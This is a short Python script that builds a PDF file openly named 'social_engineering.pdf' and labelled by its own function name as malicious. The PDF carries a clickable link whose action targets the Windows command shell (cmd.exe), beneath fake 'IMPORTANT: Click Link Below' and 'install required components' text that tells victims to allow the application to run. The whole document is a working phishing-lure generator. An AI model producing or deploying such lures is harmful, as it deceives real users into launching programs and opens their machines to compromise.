def create_simple_malicious_pdf():
    # This uses URI actions which often work
    pdf_content = """%PDF-1.4
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Contents 5 0 R>>
endobj
4 0 obj
<</Type/Annot/Subtype/Link/Rect[100 100 300 150]/Border[0 0 2]/A <</S/URI/URI(file:///C:/windows/system32/cmd.exe)>>>>
endobj
5 0 obj
<</Length 250>>
stream
BT /F1 24 Tf 100 700 Td (IMPORTANT: Click Link Below) Tj ET
BT /F1 14 Tf 100 650 Td (This document requires additional components.) Tj ET
BT /F1 14 Tf 100 600 Td (Click the link to install required components.) Tj ET
BT /F1 12 Tf 100 500 Td (>>> CLICK HERE TO CONTINUE <<<) Tj ET
BT /F1 10 Tf 100 400 Td (If prompted, allow the application to run.) Tj ET
endstream
endobj
xref
0 6
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000250 00000 n 
0000000450 00000 n 
trailer
<</Size 6/Root 1 0 R>>
startxref
600
%%EOF"""

    with open("social_engineering.pdf", "wb") as f:
        f.write(pdf_content.encode('latin-1'))
    
    print("Created social engineering PDF")
    print("This uses URI actions - user must click the link")
    print("More likely to work as it doesn't require JavaScript")

create_simple_malicious_pdf()